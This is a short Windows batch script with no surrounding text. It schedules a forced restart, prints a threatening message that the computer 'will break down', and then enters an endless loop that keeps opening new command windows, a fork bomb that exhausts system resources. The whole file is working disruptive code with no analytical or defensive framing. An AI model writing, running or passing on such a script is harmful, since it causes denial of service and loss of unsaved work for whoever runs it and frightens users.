@echo off
timeout /t 1 /nobreak >nul
shutdown -r -t 10
echo Your Computer Will Break Down In 10 Seconds
:loop
start
start
start
start
start
goto loop


